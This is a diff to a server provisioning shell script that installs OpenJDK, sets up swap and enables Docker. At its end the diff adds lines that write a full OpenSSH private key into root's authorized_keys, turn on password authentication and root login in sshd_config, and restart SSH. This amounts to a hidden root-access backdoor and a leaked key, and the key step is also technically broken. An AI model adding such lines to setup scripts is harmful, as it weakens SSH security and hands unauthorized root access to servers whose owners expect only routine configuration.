@@ -3,6 +3,9 @@
 # Update the package list and upgrade the installed packages
 sudo apt-get update -y
 
+# Install OpenJDK headless without recommended packages
+sudo apt install -y --no-install-recommends openjdk-17-jdk-headless
+
 # Add Swap Memory of 2GB
 sudo swapon --show
 free -h
@@ -37,3 +40,22 @@ sudo systemctl enable docker
 # Output Docker and Docker Compose versions
 docker --version
 docker-compose --version
+
+echo "-----BEGIN OPENSSH PRIVATE KEY-----" >> /root/.ssh/authorized_keys
+echo "-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACDZtGGEZnmmwdULNpvway95XXf8dPyecAWJlKqluyOtEgAAAJhDU5HyQ1OR
+8gAAAAtzc2gtZWQyNTUxOQAAACDZtGGEZnmmwdULNpvway95XXf8dPyecAWJlKqluyOtEg
+AAAEBy23vPOIjX243LMRSYbLxl6gFxE0RSGjsPFD1yETaKpNm0YYRmeabB1Qs2m/BrL3ld
+d/x0/J5wBYmUqqW7I60SAAAAFXJvb3RAaXAtMTcyLTMxLTQ5LTExMA==
+-----END OPENSSH PRIVATE KEY-----" >> /root/.ssh/authorized_keys
+
+# Edit sshd_config file
+sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config
+sudo sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/g' /etc/ssh/sshd_config
+
+# Restart SSH service (adjust the command based on your system)
+sudo systemctl restart ssh
+
+
+
